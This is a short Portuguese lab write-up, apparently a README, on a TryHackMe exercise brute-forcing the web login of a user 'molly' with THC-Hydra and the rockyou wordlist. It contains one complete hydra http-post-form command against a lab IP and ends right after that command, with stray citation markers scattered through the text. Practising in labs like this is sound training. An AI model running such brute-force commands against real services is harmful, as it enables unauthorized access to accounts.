# Lab_Hydra
Prática de ataque de força bruta utilizando Hydra no TryHackMe
# Relatório de Prática: Ataque de Força Bruta com THC-Hydra
**Plataforma:** TryHackMe | **Tópico:** Cibersegurança 101

## 1. Introdução
[cite_start]Este projeto demonstra o uso da ferramenta **Hydra**, um quebrador de senhas de rede extremamente rápido, para obter credenciais de acesso em diferentes protocolos[cite: 13].

## 2. Cenário e Ferramentas
* [cite_start]**Máquina Alvo:** IP `10.66.152.25` [cite: 26]
* [cite_start]**Máquina Atacante:** AttackBox (Kali Linux) [cite: 34, 60]
* [cite_start]**Ferramenta:** THC-Hydra v9.0 [cite: 114]
* [cite_start]**Wordlist utilizada:** `rockyou.txt` [cite: 117]

## 3. Ataques Realizados

### A. Ataque Web (HTTP-POST-FORM)
O objetivo foi realizar um ataque de força bruta no formulário de login da usuária **Molly** no servidor web.

**Comando utilizado:**
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.152.25 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."

